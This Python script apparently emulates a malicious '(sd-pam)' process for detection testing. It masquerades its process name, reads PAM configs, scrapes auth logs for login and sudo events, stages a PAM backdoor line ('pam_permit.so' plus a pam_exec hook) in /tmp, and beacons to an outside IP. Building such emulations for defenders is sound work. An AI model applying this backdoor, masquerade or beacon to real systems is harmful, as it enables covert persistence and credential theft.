from __future__ import annotations

import pathlib
import socket
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

# Real (sd-pam): always child of systemd --user, never makes network connections
# This one: wrong parent, reads PAM configs, scrapes auth logs, beacons out
PROC = "(sd-pam)"
PAM_SESSIONS_FILE = pathlib.Path("/tmp/.pam_sessions")
PAM_INJECT_FILE = pathlib.Path("/tmp/.pam_inject")


def read_pam_configs() -> None:
    paths = [
        "/etc/pam.d/common-auth",
        "/etc/pam.d/sshd",
        "/etc/pam.d/sudo",
        "/etc/pam.d/login",
        "/etc/pam.conf",
    ]
    for path in paths:
        try:
            content = pathlib.Path(path).read_text()
            log(PROC, f"Read {path}: {len(content)} bytes")
        except Exception:
            pass


def scrape_auth_log() -> None:
    auth_logs = ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog"]
    for log_path in auth_logs:
        try:
            content = pathlib.Path(log_path).read_text()
            sessions = [l for l in content.splitlines()
                        if "Accepted" in l or "session opened" in l or "sudo" in l]
            if sessions:
                with PAM_SESSIONS_FILE.open("a") as f:
                    f.write("\n".join(sessions[-20:]) + "\n")
                log(PROC, f"Scraped {len(sessions)} auth events from {log_path}")
        except Exception:
            pass


def write_pam_inject() -> None:
    # Simulates what a real PAM backdoor would insert — does NOT actually modify pam.d
    payload = "auth sufficient pam_permit.so\nauth optional pam_exec.so /tmp/.pam_hook.sh\n"
    try:
        PAM_INJECT_FILE.write_text(payload)
        log(PROC, f"PAM inject payload staged at {PAM_INJECT_FILE}")
    except Exception:
        pass


def beacon() -> None:
    # example.com's IP — legitimate infrastructure, wrong context for a PAM helper
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("93.184.216.34", 443))
        s.sendall(b"\x16\x03\x01\x00\x28" + b"\x00" * 40)  # Fake TLS ClientHello fragment
        log(PROC, "Beacon sent to 93.184.216.34:443")
        s.close()
    except Exception as e:
        log(PROC, f"Beacon failed: {e}")


def main() -> None:
    set_proc_name(PROC)
    read_pam_configs()
    write_pam_inject()
    log(PROC, "(sd-pam) helper started")

    while True:
        # Minimal footprint — long sleeps, single actions
        time.sleep(jitter(600.0, 0.5))
        action = random.choice(["scrape", "beacon", "pam", "idle", "idle"])
        match action:
            case "scrape":  scrape_auth_log()
            case "beacon":  beacon()
            case "pam":     read_pam_configs()
            case _:         pass


main()
